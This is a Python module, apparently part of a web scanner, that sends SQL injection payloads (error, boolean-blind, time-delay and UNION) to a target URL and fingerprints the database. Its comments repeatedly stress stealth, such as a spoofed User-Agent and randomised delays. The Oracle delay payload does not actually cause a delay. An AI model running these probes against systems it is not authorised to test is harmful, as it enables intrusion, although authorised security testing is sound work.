"""
sql_injection.py
----------------
Enhanced SQL injection detection module with multiple attack vectors:
- Error-based SQL injection
- Boolean-based blind SQL injection  
- Time-based blind SQL injection
- Union-based SQL injection
- Multiple parameter testing
- Database fingerprinting

Severity:
- Confirmed SQL injection = Critical
- Possible SQL injection = High
- Time-based anomaly = Medium
- No SQLi found = Info
"""

import requests
import time
import random
import urllib.parse
from typing import Optional, List, Dict, Tuple
from urllib.parse import urlparse, parse_qs
from colorama import Fore
import re

# Conservative fallback headers
FALLBACK_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

class SQLInjectionTester:
    def __init__(self, client: Optional[object] = None):
        self.client = client
        self.baseline_times = []
        self.findings = []
        
    def _make_request(self, url: str, **kwargs) -> Optional[requests.Response]:
        """Make HTTP request using client or fallback to requests"""
        try:
            if self.client is not None:
                return self.client.get(url, allow_redirects=True, **kwargs)
            else:
                response = requests.get(
                    url, headers=FALLBACK_HEADERS, timeout=12, 
                    allow_redirects=True, **kwargs
                )
                time.sleep(random.uniform(0.5, 1.2))
                return response
        except Exception as e:
            print(Fore.RED + f"[!] Request failed: {e}")
            return None
    
    def _get_baseline_time(self, target: str, iterations: int = 3) -> float:
        """Get baseline response time for time-based detection"""
        times = []
        base_url = target.split('?')[0] + '?id=1&rnd=' + str(random.randint(1000, 9999))
        
        for _ in range(iterations):
            start_time = time.time()
            response = self._make_request(base_url)
            if response:
                elapsed = time.time() - start_time
                times.append(elapsed)
        
        return sum(times) / len(times) if times else 1.0
    
    def _test_error_based(self, target: str) -> List[Dict]:
        """Test for error-based SQL injection"""
        print(Fore.CYAN + "  [*] Testing error-based SQL injection...")
        findings = []
        
        # Graduated payload complexity for stealth
        error_payloads = [
            "'",                    # Basic syntax error
            "''",                   # Double quote escape attempt
            "'\"",                  # Mixed quotes
            "' --",                 # Comment injection
            "' #",                  # MySQL comment
            "'; --",                # Statement termination
            "' AND '1'='2",         # False condition
            "' OR '1'='1' --",      # True condition with comment
            "' UNION SELECT 1 --",  # Basic union attempt
        ]
        
        # Enhanced error patterns with database-specific detection
        error_patterns = {
            'mysql': [
                r"you have an error in your sql syntax",
                r"warning: mysql_",
                r"mysql_fetch_array\(\)",
                r"mysql_num_rows\(\)",
                r"supplied argument is not a valid mysql",
                r"column count doesn't match value count",
                r"duplicate entry .* for key"
            ],
            'postgresql': [
                r"postgresql query failed",
                r"pg_query\(\) expects",
                r"pg_exec\(\) expects",
                r"syntax error at or near",
                r"unterminated quoted string",
                r"invalid input syntax for"
            ],
            'mssql': [
                r"microsoft sql server",
                r"odbc sql server driver",
                r"microsoft access driver",
                r"unclosed quotation mark",
                r"incorrect syntax near",
                r"conversion failed when converting"
            ],
            'oracle': [
                r"ora-[0-9]{5}",
                r"oracle error",
                r"oracle driver",
                r"quoted string not properly terminated"
            ],
            'sqlite': [
                r"sqlite_query",
                r"sqlite error",
                r"no such table",
                r"syntax error"
            ]
        }
        
        for payload in error_payloads:
            encoded_payload = urllib.parse.quote(payload)
            rnd = random.randint(1000, 9999)
            
            if "?" in target:
                test_url = f"{target}{encoded_payload}&rnd={rnd}"
            else:
                test_url = f"{target.rstrip('/')}/?id={encoded_payload}&rnd={rnd}"
            
            print(Fore.YELLOW + f"    [+] Testing: {payload}")
            
            response = self._make_request(test_url)
            if not response:
                continue
                
            response_text = response.text.lower()
            
            # Check for database-specific errors
            for db_type, patterns in error_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, response_text):
                        findings.append({
                            "issue": f"SQL Injection ({db_type.upper()}) with payload: {payload}",
                            "severity": "Critical",
                            "evidence": f"Error pattern: {pattern}",
                            "url": test_url
                        })
                        print(Fore.RED + f"[!] SQL Injection detected! Database: {db_type.upper()}")
                        return findings  # Return immediately on confirmed finding
        
        return findings
    
    def _test_boolean_blind(self, target: str) -> List[Dict]:
        """Test for boolean-based blind SQL injection"""
        print(Fore.CYAN + "  [*] Testing boolean-based blind SQL injection...")
        findings = []
        
        # Boolean test pairs (true/false conditions)
        boolean_tests = [
            ("' AND '1'='1", "' AND '1'='2"),           # Basic true/false
            ("' OR '1'='1", "' OR '1'='2"),             # OR true/false
            ("' AND 1=1 --", "' AND 1=2 --"),           # Numeric true/false
            ("' OR 1=1 --", "' OR 1=2 --"),             # OR numeric
            ("' AND (1)=(1", "' AND (1)=(2"),           # Parentheses
        ]
        
        base_url = target.split('?')[0]
        
        for true_payload, false_payload in boolean_tests[:2]:  # Test first 2 pairs for stealth
            print(Fore.YELLOW + f"    [+] Testing boolean pair: {true_payload} vs {false_payload}")
            
            # Test true condition
            true_encoded = urllib.parse.quote(true_payload)
            true_url = f"{base_url}?id=1{true_encoded}&rnd={random.randint(1000, 9999)}"
            true_response = self._make_request(true_url)
            
            if not true_response:
                continue
                
            # Test false condition  
            false_encoded = urllib.parse.quote(false_payload)
            false_url = f"{base_url}?id=1{false_encoded}&rnd={random.randint(1000, 9999)}"
            false_response = self._make_request(false_url)
            
            if not false_response:
                continue
            
            # Compare responses for significant differences
            if self._responses_differ_significantly(true_response, false_response):
                findings.append({
                    "issue": f"Boolean-based Blind SQL Injection detected",
                    "severity": "Critical",
                    "evidence": f"True payload: {true_payload}, False payload: {false_payload}",
                    "url": base_url
                })
                print(Fore.RED + f"[!] Boolean-based Blind SQLi detected!")
                return findings
        
        return findings
    
    def _test_time_based(self, target: str) -> List[Dict]:
        """Test for time-based blind SQL injection"""
        print(Fore.CYAN + "  [*] Testing time-based SQL injection...")
        findings = []
        
        baseline_time = self._get_baseline_time(target)
        delay_seconds = 3  # Conservative delay for stealth
        
        # Time-based payloads for different databases
        time_payloads = [
            f"' AND SLEEP({delay_seconds}) --",              # MySQL
            f"'; WAITFOR DELAY '00:00:0{delay_seconds}' --", # SQL Server  
            f"' || pg_sleep({delay_seconds}) --",            # PostgreSQL
            f"' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) as x WHERE ROWNUM <= {delay_seconds*1000000}) > 0 --"  # Oracle
        ]
        
        base_url = target.split('?')[0]
        
        for payload in time_payloads[:2]:  # Test first 2 for stealth
            print(Fore.YELLOW + f"    [+] Testing time-based: {payload}")
            
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{base_url}?id=1{encoded_payload}&rnd={random.randint(1000, 9999)}"
            
            start_time = time.time()
            response = self._make_request(test_url)
            elapsed_time = time.time() - start_time
            
            if response and elapsed_time > (baseline_time + delay_seconds - 1):
                findings.append({
                    "issue": f"Time-based Blind SQL Injection detected",
                    "severity": "Critical", 
                    "evidence": f"Response time: {elapsed_time:.2f}s vs baseline: {baseline_time:.2f}s",
                    "url": test_url
                })
                print(Fore.RED + f"[!] Time-based SQLi detected! Time: {elapsed_time:.2f}s")
                return findings
            elif elapsed_time > (baseline_time + 2):
                findings.append({
                    "issue": f"Possible time-based SQL injection (anomalous timing)",
                    "severity": "Medium",
                    "evidence": f"Response time: {elapsed_time:.2f}s vs baseline: {baseline_time:.2f}s",
                    "url": test_url
                })
        
        return findings
    
    def _test_union_based(self, target: str) -> List[Dict]:
        """Test for union-based SQL injection"""
        print(Fore.CYAN + "  [*] Testing union-based SQL injection...")
        findings = []
        
        # Conservative union payloads
        union_payloads = [
            "' UNION SELECT 1 --",
            "' UNION SELECT 1,2 --", 
            "' UNION SELECT 1,2,3 --",
            "' UNION ALL SELECT null --",
            "' UNION ALL SELECT null,null --"
        ]
        
        base_url = target.split('?')[0]
        
        for payload in union_payloads[:3]:  # Test first 3 for stealth
            print(Fore.YELLOW + f"    [+] Testing union: {payload}")
            
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{base_url}?id=-1{encoded_payload}&rnd={random.randint(1000, 9999)}"
            
            response = self._make_request(test_url)
            if not response:
                continue
                
            response_text = response.text.lower()
            
            # Look for successful union indicators
            union_indicators = [
                r"the used select statements have a different number of columns",
                r"all queries combined using a union",
                r"conversion failed when converting",
                r"operand should contain \d+ column",
            ]
            
            for indicator in union_indicators:
                if re.search(indicator, response_text):
                    findings.append({
                        "issue": f"Union-based SQL Injection with payload: {payload}",
                        "severity": "Critical",
                        "evidence": f"Union indicator: {indicator}",
                        "url": test_url
                    })
                    print(Fore.RED + f"[!] Union-based SQLi detected!")
                    return findings
        
        return findings
    
    def _test_multiple_parameters(self, target: str) -> List[Dict]:
        """Test SQL injection in multiple parameters if they exist"""
        findings = []
        
        parsed_url = urlparse(target)
        if not parsed_url.query:
            return findings
            
        params = parse_qs(parsed_url.query)
        if len(params) <= 1:
            return findings
            
        print(Fore.CYAN + f"  [*] Testing {len(params)} parameters for SQL injection...")
        
        # Test each parameter with a simple payload
        simple_payload = "'"
        
        for param_name in list(params.keys())[:3]:  # Limit to first 3 params for stealth
            print(Fore.YELLOW + f"    [+] Testing parameter: {param_name}")
            
            # Build URL with payload in specific parameter
            new_params = params.copy()
            new_params[param_name] = [simple_payload]
            
            query_parts = []
            for k, v_list in new_params.items():
                for v in v_list:
                    query_parts.append(f"{k}={urllib.parse.quote(str(v))}")
            
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{'&'.join(query_parts)}"
            
            response = self._make_request(test_url)
            if not response:
                continue
                
            # Quick error check
            if any(error in response.text.lower() for error in [
                "sql syntax", "mysql", "postgresql", "ora-", "microsoft sql"
            ]):
                findings.append({
                    "issue": f"SQL Injection in parameter '{param_name}'",
                    "severity": "Critical",
                    "evidence": f"Parameter: {param_name}",
                    "url": test_url
                })
                print(Fore.RED + f"[!] SQLi detected in parameter: {param_name}")
        
        return findings
    
    def _responses_differ_significantly(self, resp1: requests.Response, resp2: requests.Response) -> bool:
        """Check if two responses differ significantly (for boolean-based detection)"""
        if not resp1 or not resp2:
            return False
            
        # Status code difference
        if resp1.status_code != resp2.status_code:
            return True
            
        # Content length difference (>10% change)
        len1, len2 = len(resp1.text), len(resp2.text)
        if len1 > 0 and abs(len1 - len2) / len1 > 0.1:
            return True
            
        # Response time difference (>50% change)
        if hasattr(resp1, 'elapsed') and hasattr(resp2, 'elapsed'):
            time1 = resp1.elapsed.total_seconds()
            time2 = resp2.elapsed.total_seconds()
            if time1 > 0 and abs(time1 - time2) / time1 > 0.5:
                return True
                
        return False


def run(target: str, client: Optional[object] = None) -> List[Dict]:
    """
    Main SQL injection testing function
    """
    print(Fore.CYAN + "\n[*] Checking for SQL Injection...")
    
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    
    tester = SQLInjectionTester(client)
    all_findings = []
    
    # Run different types of SQL injection tests
    test_methods = [
        tester._test_error_based,
        tester._test_boolean_blind,
        tester._test_time_based,
        tester._test_union_based,
        tester._test_multiple_parameters
    ]
    
    for test_method in test_methods:
        try:
            findings = test_method(target)
            all_findings.extend(findings)
            
            # If we found critical findings, stop testing for stealth
            if any(f.get("severity") == "Critical" for f in findings):
                print(Fore.YELLOW + "  [!] Critical findings detected, stopping further tests for stealth")
                break
                
        except Exception as e:
            print(Fore.RED + f"[!] Error in {test_method.__name__}: {e}")
    
    if not all_findings:
        print(Fore.GREEN + "[-] No SQL Injection vulnerability detected.")
        all_findings.append({"issue": "No SQLi detected", "severity": "Info"})
    else:
        print(Fore.MAGENTA + f"[*] SQL injection testing completed. Found {len([f for f in all_findings if f.get('severity') == 'Critical'])} critical findings.")
    
    return all_findings